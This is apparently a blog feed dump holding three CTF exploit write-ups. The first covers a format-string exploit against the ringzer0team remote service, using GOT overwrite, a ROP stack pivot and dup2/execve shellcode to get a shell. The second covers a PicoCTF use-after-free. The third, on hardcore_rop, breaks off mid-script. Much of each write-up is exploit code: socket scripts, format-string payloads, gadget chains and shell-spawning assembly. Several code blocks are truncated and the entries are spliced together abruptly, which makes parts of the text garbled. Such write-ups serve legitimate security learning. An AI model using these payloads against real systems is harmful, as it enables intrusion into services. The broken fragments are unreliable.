    <content type="html"><![CDATA[<p>You might remember my first <a href="https://staringintodevnull.blogspot.nl/2014/09/maximum-overkill-rop-exploit-for.html">Maximum Overkill writeup</a>, where I made a ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise. I completed another over-the-top, why-would-you-even-do-this exploit for a CTF challenge and figured I&rsquo;d shared it.</p>

<!-- more -->


<p><a href="http://ringzer0team.com">ringzer0team</a> has a very nice, long-running CTF going on. I already did the <a href="https://barrebas.github.io/blog/2015/02/09/solving-the-x86-64-shellcoding-challenges-of-ringzer0ctf/">shellcoding challenges</a>, which I really enjoyed. I completed the fourth pwnable level on an evening, which simply involved dumping the stack via a format string bug and grabbing a password. I thought to myself: &ldquo;would I be able to get a shell using this format string vulnerability?&rdquo;</p>

<p>This writeup is made with Hindsight<sup>tm</sup> and as such, I have not included all the paths that led nowhere or the mistakes I have made. I have tried to include the thought-process as much as possible.</p>

<h2>Dumping the Stack</h2>

<p>OK, onwards! One catch is that the remote box is a 64-bit system and I don&rsquo;t have the binary itself. We do have a snippet of source code and the ability to dump the stack from within a vulnerable <code>sprintf</code> call:</p>

<pre><code class="c">    char *response = NULL;
    char *cleanBuffer = NULL;

    response = (char*)malloc(2048);
    memset(response, 0, 2048);

    cleanBuffer = (char*)malloc(strlen(buf));
    memset(cleanBuffer, 0, strlen(buf));

    strncpy(cleanBuffer, buf, strlen(buf) - 1);

    char test[] = "AAAABBBBCCCC";
    char flag[] = "XXXXXXXXXXXXXXXXXXXXXXXXXX";

    if(strcmp(flag, cleanBuffer) == 0) {
        strcpy(response, "Here's your flag FLAG-XXXXXXXXXXXXXXXXXXXXXXXXXX.\n");
    } else {
        sprintf(response, cleanBuffer); // &lt;-- we have a format string vulnerability here
        sprintf(response, "%s is a wrong password.\n\nPassword:", response);
    }
</code></pre>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%lx-%lx-%lx-%lx-%lx-%lx-
17f4880-25-0-80-7fffd6e74448-200000000- is a wrong password.
</code></pre>

<p>The fifth address jumps out. It is either a stack address, or a <code>libc</code> address. Let&rsquo;s see what it points to:</p>

<p><img src="/assets/maximum-overkill-two/00-what-does-the-stack-contain.png" alt="" /></p>

<p>I tried to write to it using <code>%n</code>, which didn&rsquo;t crash the remote binary. This meant that it most likely is a stack address! I wrote a small python script to dump the stack. I noticed I could not re-use the connection I made via python sockets, so I had to reconnect for every format string I sent.</p>

<pre><code class="python">import struct
from socket import *

def grab(i):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('pwn01.ringzer0team.com', 13377))

    s.recv(128)
    s.send('%'+str(i)+'$lx\n')

    data = s.recv(64)
    addr = data.split()[0]

    print i, addr
    s.close()

for z in range(700):
    grab(z)
</code></pre>

<p>This indeed dumped out the data on the stack. I found where the fifth parameter was pointing to:</p>

<pre><code>...snip...
633 7fffeecd9c28
634 1c
635 2
636 7fff00000042
637 7fffeecdaf65
638 0
...snip...
</code></pre>

<p>See, it points to the 636th parameter, because the lower 32 bits contain the value I&rsquo;ve just written with <code>%n</code>! Pretty neat. So with <code>%&lt;parameter number&gt;$lx</code> I could view what that particular parameter contained, and with <code>%&lt;parameter number&gt;$s</code> I could see what it pointed to (provided it was pointing to a valid memory address!) I wondered where the 636th parameter pointed to:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.
</code></pre>

<p>Interesting! I figured I could use this to my advantage&hellip; The 5th parameter points to the 636th, which itself points to somewhere on the stack. I could write to the address contained in the 636th parameter, like so:</p>

<pre><code class="bash">bas@tritonal:~$ nc pwn01.ringzer0team.com 13377
HF Remote Secure Shell [1.3.37]

Password:%636$lx
7fff3ca49f51 is a wrong password.

Password:%636$s
/home/crackme/fs_64 is a wrong password.

Password:%66c%636$hhn                  
                                                                 ï¿½ is a wrong password.

Password:%636$s
Bhome/crackme/fs_64 is a wrong password.
</code></pre>

<h2>Write what where now?</h2>

<p>But more importantly, I could write <strong>to</strong> the 636th parameter <em>via</em> the fifth, giving me a write-what-where primitive! So, for instance, to write to <code>0x7fff3ca49f00</code>, I&rsquo;d first do <code>%256c%5$hhn</code>. This will overwrite the last byte of the 636th parameter with a NULL. Then, I&rsquo;d write to the address using <code>%66c%636$hhn</code>. Finally, I&rsquo;d like to know where this byte was written, which turned out to be the easiest: we have the address of <code>636</code>, and we have another address <code>0x7fff3ca49f00</code>. Subtracting the first from the latter and dividing by 8 gives the format string parameter we need to access the written byte directly! I wrote a simple proof-of-concept for this.</p>

<p>The following python code abuses the format string vulnerability to write out &lsquo;BAS&rsquo; to an area on the stack. We can access it indirectly with <code>%636$s</code> and directly using <code>%&lt;parameter&gt;$lx</code>, given the proper format parameter. The funny thing that I noticed was that my changes to the stack were persistent, even after reconnecting. This meant that the binary did not fork(), but handled each request by itself. This is interesting for later&hellip;</p>

<p>This is great, because I have a write-what-where primitive know! My first thought was to overwrite a GOT entry with <code>system()</code>. For that to work, I needed several things: the address of system() in libc, and thus which version of libc I was dealing with; and the address of a GOT pointer which I could overwrite. First things first, I wrote a dumper script to start dumping the binary.</p>

<h2>Slam Dump </h2>

<p>Using the <code>write-an-address-to-scratch-space</code> primitive, I started dumping the binary. I added a function to dump from a specific memory address and I verified it by grabbing the bytes at <code>0x400000</code>. These should correspond to the magic bytes of an ELF header.</p>

read from 0x400000: 0x10102464c457f
</code></pre>

<p>Indeed, this dumps out the ELF header&rsquo;s magic bytes! By this time, I noticed that trying to read from an address that contains a NULL byte as the first byte, returns 0x7369. I used this in the dumper to identify NULL bytes.</p>

<p>From here on out, I adjusted the script to dump out the entire binary. It was a slow process, but I managed to speed it up a bit by not having it write out the full address each time, and dumping as much bytes as possible (I adjusted the <code>grab_value_indirectly</code>). The problem with the dumping process via <code>sprintf</code> is that it stops dumping bytes when it hits a <code>0x0a</code>, <code>0x0d</code> or <code>0x00</code> byte. I have no way of knowing which one it actually is, so I assumed NULL bytes. This gave me an imperfect dump, which I could not run and <code>readelf</code> could not make heads or tails of the section headers.</p>

<p>This meant that I had no way of knowing exactly where each GOT entry was, and which function address each entry held. Reverse engineering the dumped binary provided an alternative. I was looking at the output of <code>xxd</code> and noticed the following:</p>

<pre><code class="bash">...snip...
00014a0: ffc7 8580 edff ff41 4141 41c7 8584 edff  .......AAAA.....
00014b0: 0042 4242 42c7 8588 edff ff43 4343 43c6  .BBBB......CCCC
...snip...
</code></pre>

<p>This looks familiar, doesn&rsquo;t it?</p>

<pre><code class="c">char test[] = "AAAABBBBCCCC";
</code></pre>

<p>I out those bytes, starting at 0x1260, and ran the resulting string through <code>rasm2</code>. This gave me the raw bytes:</p>

<pre><code class="bash">$ xxd -c 1 dump |grep 1260 -A512 | awk '{print $2}' |tr -d '\n'
b800000000e8b6f8ffffc78540edffff48460052c78544edffff656d6f74c78548edffff
65005365c7854cedffff63757265c78550edffff00536865c78554edffff6c6c005bc785
...snip...
</code></pre>

<p>I ran this output through <code>rasm2</code> to show the corresponding assembly code. I put in the correct starting address for rasm2. This is the address of the start of the binary (0x400000) plus the offset from which I&rsquo;ve dumped, 0x1260. A bit of reverse-engineering led me to identify <code>malloc</code>, <code>memset</code> and <code>strlen</code>:</p>

<pre><code class="bash">$ echo 'b800...' | rasm2 -d -b 64 -o 0x401260 -

mov dword [rbp-0x50], 0x0
mov eax, [rbp-0x20]
cmp eax, [rbp-0x1c]
jnz dword 0x4015d1
// char *response = NULL;
mov qword [rbp-0x58], 0x0       
// char *cleanBuffer = NULL;
mov qword [rbp-0x60], 0x0   
// response = (char*)malloc(2048);  
mov edi, 0x800                  
call dword 0x400ba0             
mov [rbp-0x58], rax
// memset(response, 0, 2048);
mov rax, [rbp-0x58]
mov edx, 0x800
mov esi, 0x0
mov rdi, rax
call dword 0x400b40
// cleanBuffer = (char*)malloc(strlen(buf));
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 
mov rdi, rax
call dword 0x400ba0
mov [rbp-0x60], rax
lea rax, [rbp-0x11f0]
</code></pre>

<p>Now, these calls go to the PLT, which uses an address located in the GOT to do the actual library call. From the disassembly and the raw bytes, I was able to find out to which memory address the calls go. For example, let&rsquo;s find the address of the GOT entry for <code>strlen</code>. From the disassembly provided above, I know it&rsquo;s PLT stub is at <code>0x400b00</code>, so dumping from <code>0xb00</code>:</p>

<pre><code>0000b00: ff25 fa0f 0000 6807 0000 00e9 70ff ffff  .%....h.....p...
</code></pre>

<p>This disassembles to</p>

<pre><code class="bash">$ rasm2 -d -b 64 -o 0x400b00 -
ff25fa0f0000
jmp qword [rip+0xffa]
</code></pre>

<p>So it actually references the QWORD at <code>0x400b00</code> + <code>6</code> + <code>0x0ffa</code>, which is <code>0x401b00</code>. This made no sense to me, and it still doesn&rsquo;t. I know for a fact that the GOT is actually at <code>0x60xxxx</code>, so I took a chance and dumped the bytes from that location. This indeed contained a libc address! Assuming my reversing skills are okay, I have a way to read two libc addresses to two known functions! This would allow me to identify which libc version is in use and get me one step closer to my goal of shelling this challenge out.</p>

<h2>libc Version: Computer Says No</h2>

<p>To identify the libc version in use, I&rsquo;d need two libc addresses and the corresponding function names. I could compare the difference of these addresses to those found on the libc binaries I had. I used my <a href="https://gist.github.com/barrebas/e99194a4ac8b5252773c">own little script</a> for this. Alas, I found no exact match, even though I had downloaded all the libc versions that Debian provided. It did seem, however, that the libc in use on the remote box was very similar to <a href="https://packages.debian.org/wheezy/amd64/libc-bin/download">libc 2.13-38</a>. This gave me a handle and soon I was dumping from libc. I did this by first grabbing <code>strlen</code> from the GOT, and then subtracting the offset of <code>strlen</code>. This yielded a wrong libc base, but it was good enough to use a reference in combination with libc-2.13-38.</p>

<p>I decided to look for <code>system()</code> the old fashioned way: by dumping all the bytes from the <code>libc_base + system_offset_in_libc-2.13</code> - 0x1000 to +0x1000. In these bytes, I found <code>system()</code> at -0x90:</p>

<pre><code>0000f70: 5348 83ec 1048 85ff 7416 8b05 4ca9 3400  SH...H..t...L.4.
0000f80: 85c0 7526 4883 c410 5be9 82fb ffff 6690  ..u&amp;H...[.....f.
</code></pre>

<p>You see, <code>system()</code> in libc 2.13 looks like this:</p>

<pre><code>objdump -d -M intel libc-2.13.so |grep system -A10

000000000003fc70 &lt;__libc_system&gt;:
   3fc70:   53                      push   rbx
   3fc71:   48 83 ec 10             sub    rsp,0x10
   3fc75:   48 85 ff                test   rdi,rdi
   3fc78:   74 16                   je     3fc90 &lt;__libc_system+0x20&gt;
   3fc7a:   8b 05 6c b9 34 00       mov    eax,DWORD PTR [rip+0x34b96c]        # 38b5ec &lt;argp_program_version_hook+0x1b4&gt;
   3fc80:   85 c0                   test   eax,eax
   3fc82:   75 26                   jne    3fcaa &lt;__libc_system+0x3a&gt;
   3fc84:   48 83 c4 10             add    rsp,0x10
   3fc88:   5b                      pop    rbx
   3fc89:   e9 82 fb ff ff          jmp    3f810 &lt;__strtold_l+0x10&gt;
   3fc8e:   66 90                   xchg   ax,ax
</code></pre>

<p>That&rsquo;s a perfect match! I had the address of system. I turned my attention to overwriting a GOT entry. I settled on overwriting <code>strlen</code>&rsquo;s GOT entry. After the overwriting was done, the next connection would use my <code>buf</code> as input for <code>system()</code>:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// disassembly:
lea rax, [rbp-0x11f0]
mov rdi, rax
call dword 0x400b00 &lt; the GOT entry for strlen will be pointing to system!
</code></pre>

<p>The addresses for <code>strlen</code> and <code>system</code> only differed in the last three bytes. Therefore, I had to figure out a way to write three bytes at the same time; if I overwrote one byte each time, then by the time I connected to overwrite the second byte, I&rsquo;d get a crash. This is because the GOT entry for strlen would be pointing to a rather random memory location!</p>

<p>So, writing three bytes at once requires three memory address to be present on the stack, which can be addressed directly. From there, I again used the <code>%&lt;number&gt;%&lt;offset&gt;$hhn</code> primitive to write a byte.</p>

<pre><code class="python">def write_on_stack(what, where, offset):
    # write out all the bytes of what
    # used to write addresses on the stack
    for i in range(8):
        b = (what &amp; 0xff)
        what &gt;&gt;= 8
        if b == 0:
            b = 256
        if (i+where) == 0:

<p>First, it writes out <code>0x601e20</code>, <code>0x601e21</code> and <code>0x601e22</code> on the stack. <code>0x601e20</code> is an unused memory address close the GOT entries. Then, the payload to actually write three bytes to those addresses looks like this:</p>

<pre><code>"%66c%{}$hhn%255c%{}$hhn%18c%{}$hhn\n".format(format_offset+636, format_offset+637, format_offset+638)
</code></pre>

<p>What it does, is print 66 dummy bytes (0x42 == &lsquo;B&rsquo;) and then writes out the number of bytes written so far (<code>%hhn</code>) to a location that is pointed to by parameter 636. Then, it prints 255 dummy bytes, to make the write counter overflow. Writing out the next byte with <code>%hhn</code> will output 66+255 % 256 = 61, &lsquo;A&rsquo;). The next byte is written in the same way. This allows three bytes to be written at once, and will allow overwriting the GOT entry of strlen with the address of system!</p>

</code></pre>

<p>OK, so that worked! I plugged in the values for system, the GOT entry for strlen and crossed my fingers. I tried to spawn a shell, but alas, no output. The binary had crashed though, and I tried again, this time trying for outbound access to my vps with <code>wget</code>. However, I never saw a HTTP connection and the remote binary seemed to hang. The service did not come back up. Uh-oh.</p>

<h2>Reaching out</h2>

<p>I apologized to <a href="https://twitter.com/MrUn1k0d3r">Mr.Un1k0d3r</a> via Twitter and he seemed interested in my poc. He even offered me to send the binary so I could play with it locally; I jumped at this chance of course, and requested the libc as well. Furthermore, he informed me that the box was heavily firewalled for security reasons (it being part of a CTF and all) and that my shell would not be accessible at all&hellip;</p>

<p>&hellip;Challenge accepted! :)</p>

<p>So it&rsquo;s back to the drawing board. The <code>system()</code> trick would not work, as the binary was not being ran using <code>socat</code>. It handled all the connections itself. Spawning a shell would not connect stdin, stdout and stderr to the socket that the binary was using, effectively stopping me from interacting with the shell.</p>

<p>Instead, I figured I could achieve an interactive shell by first using a call to <code>dup2</code> to duplicate the socket file descriptor, to couple it to stdin and stdout. This was inspired by <a href="http://shell-storm.org/shellcode/files/shellcode-881.php">this shellcode</a>.</p>

<p>First things first, though, I needed a ROP chain to actually read in the shellcode and run it. The stack was not executable (NX took care of that), so I had find a way to call <code>mprotect</code> to mark a section <code>rwx</code> and then <code>read</code> in the shellcode.</p>

<p>I started working on the ROP chain before Mr. Un1k0d3r sent over the files. This was pretty hard, as I had to search for the gadgets in libc (the binary did not contain enough gadgets) by dumping it. I first uploaded my own libc to <a href="http://ropshell.com">ropshell</a>. Once I had found a gadget, I dumped from -0x100 to +0x100 relative to that address; this allowed me to find the gadgets I needed. Luckily, soon after, I obtained the libc and the binary from Mr.Un1k0d3r, which helped a lot. I ran it in a 64-bit Kali (based on Debian) and started building and debugging my ROP exploit. But hold on a second!</p>

<h2>Pivot the Stack</h2>

<p>This wasn&rsquo;t a buffer overflow where I had full control over the stack! The ROP chain was somewhere in <code>buf</code> and I needed to make <code>rsp</code> point to it. Only then, the ROP chain would kick off properly. I had to find a single gadget that did this in one go. I roughly knew the location of <code>buf</code> relative to <code>rsp</code> (approximately at <code>rsp+0xd8</code>, which I reverse-engineered from the disassembly of the dumped binary). Why <code>buf</code>? <code>buf</code> <strong>can</strong> contain null bytes, whereas <code>cleanBuffer</code> cannot:</p>

<pre><code class="c">strncpy(cleanBuffer, buf, strlen(buf) - 1);
</code></pre>

<p>The strncpy takes care of that; any null byte it encounters will make it stop copying. Because we&rsquo;re on 64-bit, the gadget addresses will for sure contain null bytes. Instead, have a look at where <code>strlen</code> is used:</p>

<pre><code class="c">cleanBuffer = (char*)malloc(strlen(buf));
// dissambled:
lea rax, [rbp-0x11f0]
mov rdi, rax        // rax and rdi now point to buf
call dword 0x400b00 // strlen
</code></pre>

<p>This meant that I had multiple options to pivot <code>rsp</code> to <code>buf</code>, for instance with a <code>xchg rax, rsp</code> gadget. Upon finding no suitables ones, I had to go with stack lifting. I uploaded the libc which I got from Mr. Un1k0d3r to ropshell.com and starting looking for gadgets. What would I need?</p>

<pre><code>stack lifting
syscall
pop rax
pop rdi
pop rsi
pop rdx
</code></pre>

<p>See, I needed quite a few gadgets to be able to call <code>mprotect</code> and <code>read</code>. First, the stack lifting: I settled on <code>0x00082cfe: add rsp, 0x100; ret</code> in libc. I had no idea if I would have the correct amount added to <code>rsp</code>, but I solved that the lazy way by adding the ROP equivalent of a NOP-sled:</p>

<pre><code>0x041cf9: ret
</code></pre>

<p>This will keeping returning until the ROP chain hits the next correct gadget! I put everything together and tested it locally&hellip; but no dice! I debugged it in <code>gdb-peda</code> and the <code>mprotect</code> syscall seemed to work. The shellcode, however, was not being read in properly. The socket file descriptor was the problem. It was not a predictable value, so I could not hardcode it. I found that the socket was stored on the stack, but I could not leak it via the format string vulnerability. It was located at <code>rbp-0x48</code>, so I had to adjust my ROP chain to grab this value and use it in the <code>read</code> syscall. I had to build another ROP chain to get at it&hellip;</p>

<h2>Grabbing the socket descriptor value</h2>

<p>I started looking for gadgets that allowed me to dereference <code>rbp</code>. I ended up with these ones:</p>

<pre><code>0x0002028a : pop r15; ret
0x0006933f : lea rax, [rbp + r15]; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
0x000eb938 : mov rax, [rax]; ret
0x0002c10e : xchg eax, edi; ret
</code></pre>

<p>The process is simple. The first <code>pop r15</code> will pop <code>-0x48</code> from the stack. Then, the address <code>rbp+r15</code> (effectively pointing to <code>rbp-0x48</code>) is loaded into <code>rax</code>. The value at this address is taken into <code>rax</code> in the third gadget. Finally, the value is stored in <code>edi</code>, ready for use in the <code>read</code> syscall. Here, I assume that the socket descriptor is less than 32 bits, which I think is reasonable. The <code>read</code> part of the ROP chain will read in the shellcode that we send and return to it.</p>

<p>I started with a modified read /etc/passwd shellcode, the <a href="http://shell-storm.org/shellcode/files/shellcode-878.php">original</a> of which was made by Mr.Un1k0d3r :)</p>

<h2>Putting it all together</h2>

<p>So from a high level, I use the format string vulnerability to write out the addresses of the first three bytes of the GOT entry of <code>strlen</code> to the stack. Then, using those addresses, the first three bytes of strlen&rsquo;s GOT entry are overwritten. The GOT entry of strlen then points to the stack lifting gadget. Upon connecting again, I send the ROP chain, the stack lifting gadget will be called instead of strlen, setting <code>rsp</code> to <code>buf</code>. The ROP chain kicks off and will grab the socket descriptor value, call <code>mprotect</code> and <code>read</code> in a shellcode. The shellcode will also use the socket descriptor and write the contents of <code>/etc/passwd</code> to the socket. All I have to do now is to sit back :)</p>

<p>Without further ado:</p>

<p>Cool, we have arbitrary code execution on the remote box! But remember, the goal was to get a shell&hellip;</p>

<h2>Shell&rsquo;s up</h2>

<p>The actual shellcode that landed me a shell uses <code>dup2</code> to duplicate stdin from the socket. This will allow us to communicate with the spawned shell. The assembly is quite straightforward. Not optimized, not pretty:</p>

<pre><code>bits 64

push rdi
push rdi
push 33         ; dup2
pop rax         ; set rax to dup2
                ; rdi still contains the socket fd
xor esi, esi    ; stdin
syscall
pop rdi
inc rsi         ; stdout
syscall
pop rdi
inc rsi         ; stderr
syscall

jmp _there
_here:
pop rdi         ; points to /bin/sh
xor esi, esi    ; argv = NULL
xor edx, edx    ; argp = NULL
push 59         ; execve
pop rax
syscall

push 60         ; exit
pop rax
syscall

_there:

<p>After sticking that shellcode in the exploit, I got a shell!</p>

<p><img src="/assets/maximum-overkill-two/01-interactive-shell-on-remote-box.png" alt="" /></p>

<p>You can see that the <code>dup2</code> shellcode is not completely effective; I needed to redirect stdout to stdin to get command output so somehow <code>dup2</code> does not duplicate stdout correctly. But hey, the objective is met! An interactive shell on an otherwise inaccessible server!</p>

<h2>Wrapping up</h2>

<p>This was a story of how a single format string vulnerability was beaten into arbitrary code execution. The exploit bypasses ASLR and NX via ROP, and finally sends over shellcode which will be executed. The CTF challenge was not designed with this in mind, but it was a fun exercise (and a potential warmup for Boston Key Party) nonetheless! My thanks go out to Mr.Un1k0d3r for being cool with me trying to break his challenge and even giving me the binary :)</p>

    <content type="html"><![CDATA[<p>Fancy Cache was another &ldquo;Master Challenge&rdquo; for PicoCTF. It featured a custom server, which allegedly creates a cache of strings. It&rsquo;s up to us to break it!</p>

<!--more-->


<p>We are given the source code, the binary, a libc library and a client written in Python. Wow! <code>fancy_cache</code> communicates in a difficult way, but luckily, all the heavy lifting is already done for us in <code>client.py</code>! Browsing through fancy_cache.c, we immediately felt that this had to be some kind of use-after-free bug. Indeed, there is a bug in these two functions:</p>

<pre><code class="c">struct cache_entry *cache_lookup(struct string *key) {
  size_t i;
  for (i = 0; i &lt; kCacheSize; ++i) {
    struct cache_entry *entry = &amp;cache[i];

    // Skip expired cache entries.
    if (entry-&gt;lifetime == 0) {
      continue;
    }

    if (string_eq(entry-&gt;key, key)) {
       return entry;
    }
  }

  return NULL;
}

void do_cache_get(void) {
  struct string key;
  string_init(&amp;key);
  read_into_string(&amp;key);

  struct cache_entry *entry = cache_lookup(&amp;key);
  if (entry == NULL) {
    write(STDOUT_FILENO, &amp;kNotFound, sizeof(kNotFound));
    return;
  }

  write(STDOUT_FILENO, &amp;kFound, sizeof(kFound));
  write_string(entry-&gt;value);

  --entry-&gt;lifetime;
  if (entry-&gt;lifetime &lt;= 0) {
    // The cache entry is now expired.
    fprintf(stderr, "Destroying key %s\n", entry-&gt;key-&gt;data);
    string_destroy(entry-&gt;key);
    fprintf(stderr, "Destroying value %s\n", entry-&gt;value-&gt;data);
    string_destroy(entry-&gt;value);
  }
}
</code></pre>

<p>The function <code>do_cache_get</code> will free a string struct when the lifetime goes below zero, but <code>cache_lookup</code> will happily return entries with a negative lifetime. That means we can free a string struct, <em>somehow</em> write to it, and influence the cache entries! After calls to <code>free()</code>, subsequent calls to <code>malloc()</code> will usually return recently freed memory. For instance, consider this sequence:</p>

<pre><code class="bash"># start our server
bas@tritonal:~/tmp/picoctf/fancy_cache$ socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./fancy_cache
</code></pre>

<p>And modify the client.py script a bit:</p>

<pre><code class="python"># Add an entry with a negative lifetime. This will fool cache_lookup.
cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)

# Request that value, causing it to be deleted from cache
print cache_get(f, 'keyAAAA')

# Now request the value of 'bleh'
print cache_get(f, 'bleh')
</code></pre>

<p>This results in the following debug output of the local server:</p>

<pre><code class="bash">malloc(12) = 0x8598008 (string_create)
realloc((nil), 7) = 0x8598018 (read_into_string)
malloc(12) = 0x8598028 (string_create)
realloc((nil), 8) = 0x8598038 (read_into_string)
realloc((nil), 7) = 0x8598048 (read_into_string)
Destroying key
free(0x8598008) (string_destroy str)
Destroying value
free(0x8598028) (string_destroy str)
realloc((nil), 4) = 0x8598028 (read_into_string)
</code></pre>

<p>At first, the code allocates <code>0x8598008</code> and <code>0x8598028</code> as <code>key</code> and <code>value</code> string structs, respectively. Then, we request the value of &lsquo;keyAAAA&rsquo;, causing do_cache_get to free that memory again. Next, we request the value of the non-existent key &lsquo;bleh&rsquo;. However, the program allocates space at <code>0x8598028</code>, the recently freed region! Because the cache entry is still valid (lifetime != 0), we can write a new string struct to these locations! Let&rsquo;s first try to read memory. There is a hint hidden on the remote server, waiting for us. In the local copy, it just says <code>REDACTED</code>. In order for this work, cache->key->data must point to a real string. I choose &lsquo;printf&rsquo; in the binary. So:</p>

<ul>
<li>We register a struct string with lifetime -1.</li>
<li>We fetch it; the struct string will be freed, but the cache_lookup() function will still try to use it, because lifetime != 0</li>
<li>We try to request another string struct, but this will allocate the old memory location and overwrite the old allocâed key &amp; value regions (still valid according to cache_lookup()!).</li>
<li>We âwriteâ a string struct into value:
<code>bash
old_value-&gt;length = 0xff
old_value-&gt;capacity = 0x00
old_value-&gt;data = pointer to whatever we want to read
</code></li>
<li>We write a string struct into key:</li>
</ul>


<pre><code class="bash">old_key-&gt;length = 0x6
old_key-&gt;cap = 0x00
old_key-&gt;data = pointer to string that is known, like printf -&gt;      0x8048310
</code></pre>

<p>We need that known string (printf was chosen arbitrarily) because we need the following piece of code to evaluate to true:</p>

<pre><code class="c">    if (string_eq(entry-&gt;key, key)) {
       return entry;
    }
</code></pre>

<ul>
<li>We request the key called &lsquo;printf&rsquo;; the cache_lookup will succeed, and it will give us the memory that is stored at old_value->data, which is supplied by us!</li>
</ul>


<pre><code class="python">### modifications to client.py:

# Add an entry to the cache
assert cache_set(f, 'keyAAAA', 'AAAA____', 0xffffffff)
# Delete from cache
print cache_get(f, 'keyAAAA')
# This is read into the old "value" struct (used to be 0x8, 0x0, *(AAAA____)). 
print cache_get(f, '\xff\x00\x00\x00\x00\x00\x00\x00\xc9\x8b\x04\x08')
# This is read into the old "key" struct (used to be 0x7, 0x0, *(keyAAAA))
# We supply the address of 'printf', so the check will pass &amp; we read whatever is at value-&gt;data
print cache_get(f, '\x06\x00\x00\x00\x06\x00\x00\x00\x10\x83\x04\x08')
# Print the actual data!
print cache_get(f, 'printf')
</code></pre>

<p>This gives the following output locally:</p>

ongratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shel
</code></pre>

<p>Aha! Hints! Actually, that page spells out exactly what we need to do. I decided to follow it, also because of the very specific mention of the address of <code>memcmp</code>, which we need to defeat ASLR. Using the same read memory trick, we grab the address of <code>memcmp</code>, which is stored at <code>0x804b014</code>. Using this address, we can calculate system by subtracting 0x142870 and adding 0x40100, the address of system in the supplied libc.so.6. Then, we need to write that value to <code>0x804b014</code> by doing a cache_set call. Finally, we need to trigger <code>memcmp</code>, which now actually calls <code>system</code>. Oof! This turned out to be less-than-trivial, mostly because of differences in the address of memcmp on my local box. Finally, I worked out the following script (hopefully with enough comments to make sense of what&rsquo;s going on):</p>

    <content type="html"><![CDATA[<p>Our team, <a href="https://ctf-team.vulnhub.com">vulnhub-ctf</a>, joined <code>picoctf</code> to improve our skills and learn a thing or two. There were many challenges, among which a few &ldquo;Master Challenges&rdquo; worth 200 points. This is a story of how we tackled <code>hardcore_rop</code>. The challenge promises ASLR, NX, PIE and what-have-you, so let&rsquo;s get cracking!</p>

<!--more-->


<p>Upon inspecting the source of code of this weird program, we see the following:</p>

<pre><code class="c">void randop() {
    munmap((void*)0x0F000000, MAPLEN);
    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    unsigned seed;
    if(read(0, &amp;seed, 4) != 4) return;
    srand(seed);
    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
        *(int *)&amp;((char*)buf)[i] = rand();
        if(i%66 == 0) ((char*)buf)[i] = 0xc3;
    }
    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
    puts("ROP time!");
    fflush(stdout);
    size_t x, count = 0;
    do x = read(0, ((char*)&amp;seed)+count, 555-count);
    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
}

int main(int argc, char *argv[]) {
    struct stat st;
    if(argc != 2 || chdir(argv[1]) != 0 || stat("./flag", &amp;st) != 0) {
        puts("oops, problem set up wrong D:");
        fflush(stdout);
        return 1;
    } else {
        puts("yo, what's up?");
        alarm(30); sleep(1);
        randop();
        fflush(stdout);
        return 0;
    }
}
</code></pre>

<p>The <code>randop()</code> function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:</p>

<pre><code class="c">    munmap((void*)0x0F000000, MAPLEN);
    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    unsigned seed;
    if(read(0, &amp;seed, 4) != 4) return;
    srand(seed);
    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
        *(int *)&amp;((char*)buf)[i] = rand();
        if(i%66 == 0) ((char*)buf)[i] = 0xc3;  
    }
    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
</code></pre>

<p>The memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can &ldquo;choose&rdquo; which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:</p>

<pre><code class="c">    size_t x, count = 0;
    do x = read(0, ((char*)&amp;seed)+count, 555-count);
    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
</code></pre>

<p>This function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let&rsquo;s enable coredumps and get control of EIP.</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (echo 7777; python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"') | ./hardcore_rop `pwd`
yo, what's up?
ROP time!
Segmentation fault (core dumped)
bas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core

...
Core was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
</code></pre>

<p>Excellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can&rsquo;t write into the region at <code>0xf000000</code> because it isn&rsquo;t writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at <code>0xf000000</code> are always at the same location. We need to find enough ROP gadgets to make the region at <code>0xf000000</code> writeable, so that we can store shellcode there and execute it.</p>

<p>For this to work, we need two things: control over registers and an <code>int 0x80</code> instruction, to execute syscalls. The region at <code>0xf000000</code> contains 40960 bytes, filled with random ROP gadgets. There could be an <code>int 0x80; ret;</code> in there. The chances are slim, but there&rsquo;s a chance nonetheless. I scripted the search for ROP gadgets with the following:</p>

<pre><code class="bash">#!/bin/bash

while read i; do
